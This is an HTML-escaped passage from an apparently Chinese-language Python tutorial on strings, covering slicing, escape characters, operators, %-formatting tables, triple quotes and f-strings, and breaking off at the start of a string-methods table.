&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;restart&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# te restart&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 截取再拼接&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
t
test
tes
st
testtest
testre
t t
te restart
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;python字符串不能改变，诸如&lt;code&gt;str[n]=&#39;?&#39;&lt;/code&gt;的赋值会报错&lt;/p&gt;
&lt;h3 id=&#34;转义字符&#34;&gt;&lt;a href=&#34;#转义字符&#34; class=&#34;headerlink&#34; title=&#34;转义字符&#34;&gt;&lt;/a&gt;转义字符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 转义字符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt; \
      &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# \续行&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testtest&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 反斜杠&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# \&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 单引号&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\&#34;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 双引号&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#34;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#39;\a&#39;)  # 响铃&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test \btest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 退格&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testtest&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\000&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1\n1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 换行&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test\vtest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 纵向制表符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#testtest&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test\ttest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 横向制表符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test	test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test eee\r11  33&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# \r后面替换前面&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 11  33&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test\ftest&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 换页&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\666&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 8进制&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# z&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\x33&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 16进制&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
testtest
\
&#39;
&#34;
testtest
 
1
1
testtest
test	test
11  33
testtest
ƶ
3
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;运算符-1&#34;&gt;&lt;a href=&#34;#运算符-1&#34; class=&#34;headerlink&#34; title=&#34;运算符&#34;&gt;&lt;/a&gt;运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 运算符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rr&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 连接符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 重复符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 索引符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# in not in 成员运算符&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;hahah&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;in&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;not in&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# %格式控制符&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
2rr
testtest
e
in
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;字符格式化&#34;&gt;&lt;a href=&#34;#字符格式化&#34; class=&#34;headerlink&#34; title=&#34;字符格式化&#34;&gt;&lt;/a&gt;字符格式化&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;我叫 %s 今年 %d 岁!&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;小明&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#我叫 小明 今年 10 岁!&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;符  号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%c&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化字符及其ASCII码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%s&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%d&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化整数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%u&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化无符号整型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%o&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化无符号八进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%x&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化无符号十六进制数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%X&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化无符号十六进制数（大写）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%f&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;格式化浮点数字，可指定小数点后的精度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%e&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;用科学计数法格式化浮点数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%E&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;作用同%e，用科学计数法格式化浮点数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%g&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;%f和%e的简写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%G&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;%f 和 %E 的简写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%p&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;用十六进制数格式化变量的地址&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;符号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;*&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;定义宽度或者小数点精度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;-&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;用做左对齐&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;在正数前面显示加号( + )&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;sp&gt;&lt;/sp&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;在正数前面显示空格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;#&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;0&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;显示的数字前面填充’0’而不是默认的空格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;%&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;‘%%’输出一个单一的’%’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;(var)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;映射变量(字典参数)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;m.n.&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;三引号&#34;&gt;&lt;a href=&#34;#三引号&#34; class=&#34;headerlink&#34; title=&#34;三引号&#34;&gt;&lt;/a&gt;三引号&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 三引号&lt;/span&gt;
para_str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;这是一个多行字符串的实例
多行字符串可以使用制表符
TAB ( \t )。
也可以使用换行符 [ \n ]。
&#34;&#34;&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;para_str&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 跨多行&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
这是一个多行字符串的实例
多行字符串可以使用制表符
TAB ( 	 )。
也可以使用换行符 [ 
 ]。
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;f-string&#34;&gt;&lt;a href=&#34;#f-string&#34; class=&#34;headerlink&#34; title=&#34;f-string&#34;&gt;&lt;/a&gt;f-string&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# f-string&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;Hello &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 替换变量&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;# 使用表达式&lt;/span&gt;
w &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#39;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;: &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;var&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
3
test: var
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数&#34;&gt;&lt;a href=&#34;#函数&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;方法及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-string-capitalize.html&#34;&gt;capitalize()&lt;/a&gt; 将字符串的第一个字符转换为大写&lt;/td&gt;
&lt;/tr&gt;
